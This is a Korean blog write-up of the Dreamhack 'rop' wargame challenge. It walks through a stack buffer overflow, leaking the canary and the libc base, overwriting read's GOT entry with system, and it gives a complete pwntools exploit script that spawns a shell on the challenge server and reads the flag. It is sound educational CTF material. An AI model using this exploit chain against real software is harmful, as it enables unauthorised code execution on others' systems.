---
title: "[Dreamhack] rop"
date: "2026-07-29T10:00:00"
last_modified_at: "2026-07-29 23:41:57"
canonical_id: "obsidian:hack/pwn/[Dreamhack] rop.md"
categories: [Hack, Pwn]
tags: [ROP]
author: "hothyun"
description: "Dreamhack rop 문제를 통해 ROP 공격 흐름과 가젯 구성, 스택 정렬 문제를 분석합니다."
image: "/assets/img/posts/preview/hack/pwn/pwn1.webp"
---


해당 포스트는 이전에 썼던 [[Dreamhack] Return to Library](https://blog.hothyun.com/posts/Dreamhack-Return-to-Library/) 와 유사한 문제에 대한 풀이 포스트이다. 앞서 설명한 개념들을 반복적으로 적지는 않을 것이어서, 이 포스트를 먼저 읽고 오늘의 포스트를 읽으면 훨씬 이해가 쉬울 것이다.

오늘 풀이할 문제는 Dreamhack의 System Hacking Basics 학습을 진행하다가 NX & ASLR 파트에서 만나게 되는 실습 문제인 [rop](https://dreamhack.io/wargame/challenges/354) Wargame이다. 개인적으로 풀면서 전에 풀었던 Return to Library 문제보다 훨씬 더 어렵다고 느껴졌다.

## 문제 분석

먼저 문제 파일을 다운받자. 다운 받으니까 여러 개의 파일이 나온다. `Dockerfile`도 있고, `flag` 도 있고, `libc.so.6` 도 있다. 그리고 평소 문제처럼 `rop`, `rop.c` 와 같이 C로 된 파일 및 이를 gcc로 컴파일한 파일도 들어있다. 실행 파일 분석 및 C 파일을 들여다보기 전에, `libc.so.6`에 대해 간단히 설명하겠다.

### libc.so.6

libc.so.6은 리눅스 OS 위에서 실행되는 모든 C/C++ 프로그램과 애플리케이션의 뼈대이자 다리 역할을 한다. C 표준 라이브러리 함수를 제공하며, 이는 C를 배울 때 사용되는 기본적인 표준 함수들, printf(), scanf(), malloc() 등등이 들어있다. 그리고 System call 함수도 들어있다. pwnable에서 많이 사용되는 read(), write(), execve() 함수 등도 여기 들어있다. 그리고 프로그램의 main() 함수가 실행되기 전과 종료된 후의 작업을 관리한다. 환경변수 및 명령줄 인자 세팅, 글로벌 변수 초기화 및 메모리 할당, main 실행 후 프로그램의 exit 및 자원 해체 까지 모두 libc.so.6에서 도와주고 있다.

이번에 문제 파일에서 libc.so.6을 줬는데, libc.so.6의 버전이 리눅스의 버전에 따라 달라질 수 있기 때문에, 문제 환경에 맞는 libc.so.6 을 준 것 같다. 내부적으로 glibc 2.31, glibc 2.35, glibc 2.39 등 세부 버전이 다르고, Ubuntu 20.04 LTS는 glibc 2.31을 쓰고 Ubuntu 22.04에서는 glibc 2.35를 쓰고 이렇게 리눅스 배포판 버전에 따라서도 사용되는 libc.so.6이 다르기 때문에 현재 환경에 맞는 libc.so.6을 준 듯 하다.

자 이제 libc.so.6에 대해서도 얼추 알아보았으니, rop 실행 파일을 조금 분석해보자.

```bash
$ file ./rop

# ./rop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2a3cdeb61fd5777406ca296e2fa0a679996adbda, not stripped

$ checksec ./rop

# Arch:       amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No
```

file 커맨드와 checksec 커맨드를 이용해서 알아본 결과, x86-64에 64비트 LSB executable이다. 그리고 Canary는 존재하며, NX도 되어있다. 하지만, PIE는 없어서 piebase 주소가 같고, Stipped: No 라고 적힌 것을 보아, 코드 조각에서의 이름 변형은 하지 않은 것 같다.

## 코드 분석

코드는 간단하다. 카나리를 leak 할 수 있게 BOF 코드를 주고, ROP payload를 실행할 수 있도록 BOF 코드를 준다.

```c
int main() {
    char buf[0x30] // 0x30만큼 buf 할당
    ...
    puts("[1] Leak Canary");
    write(1, "Buf: ", 5);
    read(0, buf, 0x100); // BOF
    printf("Buf: %s\n", buf);
    ...
    puts("[2] Input ROP payload");
    write(1, "Buf: ", 5);
    read(0, buf, 0x100); // BOF
}
```

이게 끝이다. buf를 0x30만큼 할당하라고 해두고서, read를 0x100만큼 하는 코드가 두 개나 있다. 거기에 첫 번째 read에는 printf까지 뒤에 있어서 대놓고 Canary를 leak 하라고 만들어두었다.

## GDB로 Stack Frame 살펴보기

정확히 어느 지점에 카나리가 있고, buf의 시작주소는 어디인지 알아보기 위해 gdb를 실행하자.

```bash
$ chmod +x ./rop # 권한 없을 시 권한 추가
$ gdb ./rop
```

main에다가 breakpoint를 걸고 disassemble 커맨드로 알아보니 아래와 같이 나왔다.

```text
0x00000000004006fb <+4>:     sub    rsp,0x40
0x00000000004006ff <+8>:     mov    rax,QWORD PTR fs:0x28
0x0000000000400708 <+17>:    mov    QWORD PTR [rbp-0x8],rax
```

보아하니 0x40 만큼 할당해주고, rbp-0x8 위치에다가 카나리를 넣는 것을 확인할 수 있다.

plt 명령어로 plt도 한번 확인해보면,

```text
pwndbg> plt
Section .plt 0x4005a0 - 0x400610:
0x4005b0: puts@plt
0x4005c0: write@plt
0x4005d0: __stack_chk_fail@plt
0x4005e0: printf@plt
0x4005f0: read@plt
0x400600: setvbuf@plt
```

puts, write, printf, read, setvbuf 등은 있지만, system 같은 함수는 없는 것을 확인할 수 있다. 따라서, 이 문제는 위 plt에 있는 함수들을 잘 이용해서 shell을 획득해야하는 문제인 것을 알 수 있다.

## Exploit 

이제 Exploit 전략을 짜야한다. 앞서 말했듯, 이 문제는 system 함수의 주소를 그냥 알 수가 없다. ASLR이 켜져 있어서 libc의 위치도 실행 때 마다 계속 바뀔 뿐더러, plt와 got에 system 함수가 적혀있지도 않다. 하지만, 우리가 가지고 있는 단서를 잘 조합해보면 system 함수를 실행할 수 있다.

### PLT & GOT

일단, PLT, GOT의 실행 원리에 대해서 알아야 한다. plt는 함수 호출을 담당한다. puts라는 함수가 최초로 실행되는 시점에 puts라는 libc 에서의 함수를 찾는 과정을 실행한다. 그리고 함수를 찾으면, 이 함수의 주소를 got에다가 저장하고, 해당 함수의 주소로 jmp 하여 함수를 실행한다. 즉, 정리하면,

1. 함수 최초 실행 시, plt에 있는 기계어 코드가 실행해야할 libc의 함수 주소를 찾는다.
2. 찾으면, 이를 got에다가 저장하고 함수 주소로 jmp하여 함수를 실행한다.
3. 다시 함수가 호출되면 plt에 있는 기계어 코드가 got에 이미 있는 주소이니까 찾지 말고, got에 있는 주소로 jmp를 하라고 시킨다.

여기서 취약점이 발생하는 부분은 3번째 부분이다. got에 적힌 주소를 검증하지 않고 jmp 시키므로, got에 있는 주소 값을 바꿀 수 있다면, 실행 흐름을 바꿀 수 있다.

### system 함수가 plt에 없는데 어떻게 system을 실행시키나?

이 부분이 처음 접근할 때 생각보다 어려웠다. 여기서 사용되는 핵심 개념은 이것이다.

> **ASLR 때문에 libc base의 주소는 실행 시점에 계속 변하지만, base로부터 특정 함수에 대한 오프셋은 동일한 libc 버전이면 동일한 오프셋을 가지게 설계되어있다.**

이 말은, 지금 환경에서 실행중인 libc.so.6 파일을 디버깅하여 base로부터 어느 위치에 system 함수가 있는지를 알고 있으면, 실제 실행 파일에서 libc 영역이 어디에서 시작하는 지만 알면, system 함수가 어디있는지를 알아낼 수 있다는 뜻이다.

그리고 두 번째로, 이전 포스트에서도 사용했던, assembly gadget 또한 필요하다. 저번에는 system 함수의 첫 번째 인자를 설정하기 위해 `pop rdi; ret;` 가젯을 사용했다. 그렇다면 이번에는 어떤 함수들을 써서 위에서 말한 libc base가 어디인지를 알아내야할까?

### plt에 있는 read, write 함수를 활용하자.

현재 PIE가 적용되어있지 않으므로, plt와 got는 모두 고정된 주소를 가진다. 따라서, 우리는 실행 파일을 가지고 있으므로 plt와 got가 어느 위치에 있는지를 알고 있다. 이를 이용하면, read, write의 함수를 이용하여 값을 읽어오고, 덮어쓰기가 가능해진다.

우리가 알아내야하는 것은 아래와 같다.

1. 실행 환경에서의 libc system의 주소는 어디인지
2. system 함수의 첫 번째 인자로 들어갈 "/bin/sh" 는 어떻게 찾고 넣을지
3. got에다가 libc system 주소 값을 어떻게 overwrite할지

이를 알아내기 위해서 제일 먼저 필요한 것은, 실행 환경에서의 libc 함수의 실행 주소이다. 이는 프로그램이 실행되고 buf를 read 하는 시점에서는 **got** 에 이미 적혀있는 상태이다. 따라서, 우리는 got의 read 함수의 주소를 알고 있으므로, 아래와 같은 순서로 libc base를 leak 할 수 있다.

1. 우리는 write 함수의 plt 주소를 알고있다. 이 주소로 jmp만 시킬 수 있으면, write 함수를 실행시킬 수 있다.
2. 우리는 read 함수의 got 주소를 알고 있다. 따라서, 이 주소를 기점으로 write를 하면 read의 got에 적혀있는 실제 실행파일의 libc read 파일의 주소를 알아낼 수 있다.
3. 그리고 이를 알아내면, libc.so.6 에서의 libc read함수와 libc system 함수 사이의 오프셋을 계산하여 더해주면 실행 환경에서의 libc system 함수의 주소를 알아낼 수 있다.

그리고 got overwrite를 해서, 알아낸 system 함수로 실행되게 got를 바꿔야한다. read 함수의 got를 바꾼다고 가정하면, 우리는 이미 read 함수의 got 주소 값을 알고 있으므로, read 함수를 이용해서 got를 바꿔주면 된다. 위와 동일한 원리로, read 함수의 plt 주소를 알고 있으므로, 해당 주소로 jmp를 시켜서 read 함수를 실행할 수 있다.

마지막으로, overwrite가 완료되었으면, overwrite 된 주소로 jmp를 시켜서 system 함수를 실행시키면 된다. "/bin/sh" 값을 어떻게 넣을 것인지는 조금 있다가 코드로 자세하게 다루겠다.

### Exploit 코드 짜기

이제 코드를 짜면서 한번 exploit 해보자.

```python
r = remote(<host>, <port>)
libc = ELF("./libc.so.6")
e = ELF("./rop")
```

이번에는 환경을 3개를 정의했다.

1. Flag가 실제로 들어있는 원격 서버
2. 원격 서버에서 사용 중인 동일 버전의 libc.so.6
3. 원격 서버와 동일하게 동작하는 gcc 컴파일된 실행 파일

이렇게 정의한 이유는, 직접 하나하나 다 gdb로 디버깅하면서 오프셋을 찾고 하기보다, symbols 라는 함수를 이용해서 주소를 가져와서 코드로써 이 주소를 관리하기 위함이다.

```python
# leak canary
cnry_payload = b"A"*0x39
r.sendafter(b"Buf: ", cnry_payload)

r.recvuntil(cnry_payload)
cnry = u64(b"\x00" + r.recvn(7))

slog("cnry", cnry)
```

여기서 slog는 logging 용 사용자 정의 함수이다. 이전 포스트와 동일하게 카나리를 leak 하기 위해 스택 프레임에서의 위치에 맞게 0x39까지(Canary의 마지막 바이트인 널 바이트까지) 채우고, printf되는 출력 값에서 도출된 널 바이트가 제외된 카나리 값 7바이트를 leak 했다. 그리고 canary로 그대로 쓰기 위해서는 널 바이트를 포함해줘야하므로, 그렇게 추가해서 canary를 완전하게 leak 할 수 있게 되었다.

```python
# Do ROP
# in libc.so.6
libc_system = libc.symbols["system"]
libc_read = libc.symbols["read"]

# plt, got address
target_plt_read = e.plt["read"]
target_plt_write = e.plt["write"]
target_got_read = e.got["read"]

# assembly gadget
gadget_rdi = 0x0000000000400853 # pop rdi; ret
gadget_rsi = 0x0000000000400851 # pop rsi; pop r15; ret
```

그리고 이제 각 환경에서 얻어와야 하는 값들을 정의했다. 우리는 현재 원격 서버 환경의 libc system 주소를 알아내기 위해, 먼저 이미 있는 libc.so.6 에서의 각 함수 사이의 오프셋을 알아야 한다. 따라서, 사용할 system, read 함수의 주소를 `ELF().symbols` 를 통해서 가져왔다.

read 함수에 대한 got 주소, 그리고 read, write 함수를 사용해야하므로 이 두 함수에 대한 plt 주소 또한 가져왔다. 편리하게도 `ELF().plt`, `ELF().got` 등을 통해서 주소를 쉽게 가져올 수 있다.

마지막으로, read, write 함수를 쓰려면 인자 설정을 해줘야한다. 이를 위해서 rdi, rsi, rdx 인자가 설정되어야 한다. 그런데, 실행 환경에서 이미 rdx 인자가 0x100으로 설정이 되어있다. 그 이유는 read(0, buf, 0x100) 함수 때문이다. 이 함수가 끝나고 return 하므로 rdx는 그대로 0x100으로 설정되어있다. 따라서 추가로 rdx 관련 가젯을 가져올 필요는 없다.

추가로, rdx 관련 가젯은 실행 파일의 ROPgadget에는 들어있지 않았다. 그래서 libc.so.6을 보니, rdx 가젯이 있었다. 따라서, libc base를 알고 있다면 libc.so.6에 있는 rdx 가젯을 써서 3번째 인자를 설정할 수 있다.

```python
payload = b"A"*0x38 + p64(cnry) + b"B"*0x8

# write(1, target_got_read, ...)

# rdi에 1 넣기
payload += p64(gadget_rdi) + p64(0x1) # rsp: rbp+0x18

# rsi에 target_got_read의 주소 넣기
payload += p64(gadget_rsi) + p64(target_got_read) + p64(0x0) # rsp: rbp+0x30

# write 함수 call하기 위해 target_plt_write의 주소 적기
payload += p64(target_plt_write) # rsp: rbp+0x38
```

이제 ROP를 이용해보자. 먼저, buf 영역을 더미로 채우고, 카나리도 올바르게 채워주고, SFP도 더미로 채워준다. 그리고 이제 함수의 에필로그가 실행되고 jmp될 주소가 담긴 RIP 영역부터 payload를 추가한다.

먼저 rdi에다가 1을 넣어야 한다. 표준 출력으로써 receive를 받기 위함이다. 따라서 payload에 pop rdi; ret 이 적힌 가젯 주소를 적는다. 그리고 8바이트 뒤에 0x1를 적는다. p64를 이용하면 자동으로 8바이트를 채워서 보내준다. 이렇게 쓸 수 있는 이유는, ret, pop을 할 때 마다 rsp의 주소가 8바이트씩 증가하기 때문인데, 자세한 이유는 이전 포스팅에 있다.

그리고 rsi에다가 read함수의 got 주소를 적어야 한다. 그래야 그곳에서부터 읽어내서 출력할 것이기 때문이다. 그리고, 뒤에 p64(0x0)이 있는데, 이 부분은 pop rsi 관련 가젯이 `pop rsi; pop r15; ret` 이렇게 생겼기 때문이다. 레지스터 두 개에다가 값을 넣기 때문에, 처음 pop 될 값을 read 함수의 got 주소로 적어두면 rsi에 쉽게 값을 넣을 수 있다.

마지막으로, rdx는 위에서 말했던 것 처럼 충분히 크게 설정되었으니, 이제 write 함수 실행을 해야한다. 따라서, ret 되면서 plt가 실행될 수 있게 write 함수의 plt 주소를 적어주면, pop rsi; pop rdi; ret에서 ret이 되면서 target_plt_write의 주소로 jmp를 시킨다. 이렇게 하면 rdi, rsi에 올바른 값을 넣어서 write 함수를 실행시킬 수 있다.

```python
# read(0, target_got_read, ...)
payload += p64(gadget_rdi) + p64(0x0) # rsp: rbp+0x48
payload += p64(target_plt_read) # rsp: rbp+0x50
```

그리고, 우리는 여기서 receive된 값을 받고, 거기에 system 오프셋을 더해줘서 libc system의 함수 주소를 구해낸 뒤, read를 해서 got 주소에다가 이를 overwrite 해야한다. 여기서 따로 rsi를 설정하지 않는 이유는, write 함수를 호출할 때 이미 rsi가 target_got_read로 설정되어있기 때문이다.

```python
# calling system function
payload += p64(gadget_rdi) + p64(target_got_read + 0x8) # rsp: rbp+0x60
payload += p64(target_plt_read) # rsp: rbp+0x68
```

마지막으로 rdi에다가 target_god_read에다가 덮어쓴 값 + 0x8을 가져오라고 한다. 이 이유는, 나중에 overwrite 될 주소를 적으면서 뒤에 "/bin/sh\x00" 8바이트를 넣어주면, 정확히 read 함수의 got보다 0x8 높은 위치에 "/bin/sh\x00" 이 써지기 때문이다.

```python
r.sendafter(b"Buf: ", payload)
leak_read = u64(r.recvn(6) + b"\x00"*2)
libc_offset = leak_read - libc_read
leak_system = libc_offset + libc_system

r.send(p64(leak_system) + b"/bin/sh\x00")

r.interactive()
```

이제 마지막으로 이 payload를 Input ROP payload 부분의 buf에다가 넣고, write 함수로 인해서 leak 된 원격 서버 기준 libc read 함수의 주소를 가져온다. 함수의 주소는 총 8바이트이겠지만, 주소 값 자체는 6바이트이므로 이렇게 6바이트를 받고 8바이트를 맞추기 위해 패딩으로 2바이트를 널 바이트로 넣는다. 그리고 원격 서버의 libc read 함수를 이용해서 libc system 함수가 어디있는지를 계산한다. 마지막으로 이를 ROP에서 사용되는 read 함수에다가 /bin/sh와 함께 send 하면서 got의 read 주소를 overwrite하고, 그 주소 뒷 8바이트에 /bin/sh를 넣게 됨으로써 system 함수를 이용해서 최종적으로 shell을 얻을 수 있게 된다.

전체 코드는 아래와 같다.

```python
from pwn import *

def slog(name, addr):
        return success(": ".join([name, hex(addr)]))

r = remote(<HOST>, <PORT></PORT>)
libc = ELF("./libc.so.6")
e = ELF("./rop")

context.arch = "amd64"
context.log_level = "debug"

# leak canary

cnry_payload = b"A"*0x39
r.sendafter(b"Buf: ", cnry_payload)

r.recvuntil(cnry_payload)
cnry = u64(b"\x00" + r.recvn(7)) # unpacked int

slog("cnry", cnry)

# Do ROP

# in libc.so.6

libc_system = libc.symbols["system"]
libc_read = libc.symbols["read"]

# plt & got address
target_plt_read = e.plt["read"]
target_plt_write = e.plt["write"]
target_got_read = e.got["read"]

# assembly gadget
gadget_rdi = 0x0000000000400853 # pop rdi; ret
gadget_rsi = 0x0000000000400851 # pop rsi; pop r15; ret

payload = b"A"*0x38 + p64(cnry) + b"B"*0x8

# write(1, target_got_read, ...)
payload += p64(gadget_rdi) + p64(0x1)
payload += p64(gadget_rsi) + p64(target_got_read) + p64(0)
payload += p64(target_plt_write) 

# read(0, target_got_read, ...)
payload += p64(gadget_rdi) + p64(0x0)
payload += p64(target_plt_read)

# system function calling
payload += p64(gadget_rdi) + p64(target_got_read + 0x8)
payload += p64(target_plt_read)

# send payload
r.sendafter(b"Buf: ", payload)

# calculate system func address
leak_read = u64(r.recvn(6) + b"\x00"*2)
libc_offset = leak_read - libc_read
leak_system = libc_offset + libc_system

slog("leak_read", leak_read)
slog("libc_offset", libc_offset)
slog("leak_system", leak_system)

# send overwrite address & /bin/sh string
r.send(p64(leak_system)+b"/bin/sh\x00")

r.interactive() 
```

이렇게 하고 shell을 획득한 뒤 `ls` 와 `cat flag`를 이용하여 flag 탈취에 성공헀다!